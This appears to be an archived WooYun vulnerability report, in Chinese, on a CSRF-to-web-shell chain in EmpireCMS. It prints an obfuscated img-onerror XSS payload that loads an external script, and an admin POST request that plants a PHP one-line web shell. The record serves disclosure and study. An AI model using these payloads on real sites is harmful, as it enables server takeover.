{"id": 53516, "wybug_id": "wooyun-2014-067422", "wybug_title": "EmpireCMS(帝国cms)csrf getshell", "wybug_corp": "帝国CMS", "wybug_author": "../", "wybug_date": "2014-07-09 19:29", "wybug_open_date": "2014-10-07 19:30", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-09：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2014-10-07：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： EmpireCMS(帝国cms)csrf getshell 最新版本。 详细说明：  参见漏洞: WooYun: 帝国CMS   CSRF GetShell 帝国cms默认添加栏目时候默认是允许投稿。另外帝国的会员中心基本都是开启的，有的就算不开启也是可以匿名投稿。   漏洞证明：  \n\n图1所示，帝国添加栏目时候默认是开启投稿的。\n\n图2所示，虽然过滤的<script>，但是未过滤img中的污染数据。这个地方插入\n<img src=1 onerror='var s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.type=String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116);s.src=String.fromCharCode(104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,47,49,46,106,115);document.body.appendChild(s);'>\n也就是http://127.0.0.1/1.js，1.js代码看这里 WooYun: 帝国CMS   CSRF GetShell \n\n图3所示：管理员看到未审核内容时候点击标题可以查看内容。\n\n图4所示：管理员查看预览稿件时候调用外部1.js，post /e/admin/ecmscom.php \nenews=AddUserpage&id=&oldpath=page.html&cid=&gid=1&pagemod=1&title=aaa&path=page.html&classid=0&pagetitle=&pagekeywords=&pagedescription=&pagetext=%3C%3Fphp+file_put_contents%28%27myshell.php%27%2C%27%3C%3Fphp+%24_GET%5Bc%5D%28%24_POST%5Bx%5D%29%3B%3F%3E%27%29%3B%3F%3E&Submit=%E6%8F%90%E4%BA%A4\n在/e/admin/目录生成myshell.php一句话。\n\n   修复方案：  过滤   版权声明：转载请注明来源 ../@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2014-12-22 02:36 |    \t\tziwen \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:4        | 活着为了乐还是为了苦？)\t\t \n  洞主ID很机智啊。。    \n     2015-01-08 14:39 |    \t\txtnnd \t\t\t( 普通白帽子  |\t\t\t        Rank:180 漏洞数:43        )\t\t \n  帝国CMS 7.0 可以吗  洞主测试的多少版本的    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}